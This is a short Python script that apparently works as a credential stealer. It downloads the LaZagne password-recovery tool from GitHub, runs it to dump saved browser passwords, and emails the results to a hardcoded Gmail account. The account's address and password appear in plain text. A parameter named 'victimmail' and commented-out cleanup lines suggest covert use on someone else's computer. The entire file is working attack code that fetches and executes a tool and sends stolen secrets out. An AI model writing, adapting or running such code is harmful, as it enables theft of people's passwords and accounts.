import requests
import smtplib,subprocess
import sys

import os
#import tempfile
def ss(mess, password, mymail, victimmail):
    mail =smtplib.SMTP('smtp.gmail.com',587)
    mail.starttls()
    mail.login(mymail, password)
    mail.sendmail(mymail, victimmail, mess)
    mail.quit()
def down(url):
    cont=requests.get(url)
    file_name=url.split("/")[-1]
    with open(file_name,"wb") as pk:
       pk.write(cont.content)
#file_name = sys.builtin_module_names + "/sample.jpg"
#rog =  "https://tse1.explicit.bing.net/th?id=OIP.LZSEjbib381lpilyE8yNVQHaPA&pid=Api&P=0&h=220"
#subprocess.Popen(rog, shell=True)
#temp_dir=tempfile.gettempdir()
#os.chdir(temp_dir)
down("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe")
mess =subprocess.check_output("lazagne.exe browsers", shell=True)
my_mail="epavi1635@gmail.com"
mail_password="pdfibzwqdsdnzpjw"
ss(mess, mail_password, my_mail, my_mail)
#os.remove("lazagne.exe")